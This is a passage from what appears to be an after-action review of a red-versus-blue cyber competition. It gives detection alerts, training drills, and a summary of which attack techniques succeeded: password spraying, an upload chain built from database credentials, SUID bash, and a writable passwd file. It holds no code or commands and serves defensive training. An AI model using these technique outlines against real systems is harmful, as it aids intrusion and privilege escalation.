5. **Windows:** alert guest/null SMB + sudden Files share deletion (both attack and self-inflicted Quotient red).
6. **DNS/Pi-hole:** alert when critical business names resolve to `0.0.0.0` or sinkholes.
7. **Training reps:** (1) spray-then-rotate race, (2) DB-cred→upload chain, (3) SUID enum drill, (4) writable-passwd drill, (5) Quotient-safe hardening checklist timed to 30 minutes.

---

## Bottom line

Early Valid Accounts paid while defaults lived. The durable wins were misconfigurations: remote `cdapp`, unrestricted upload, SUID bash, writable passwd. Defense that only “blocks ports” without watching Quotient PCRs, file perms, and app auth will lose the same way again.

**Next event:** harden with score checks after every change, spray first minute of offense, then hunt novel privs — not more hydra.

---

*Canvas (interactive):* https://cursor.com/canvas/store-cbb7d87f-f3f6-4b05-842d-32a1949bbc8b/915c9674-cfda-46d1-b6ea-35c1a930ee27
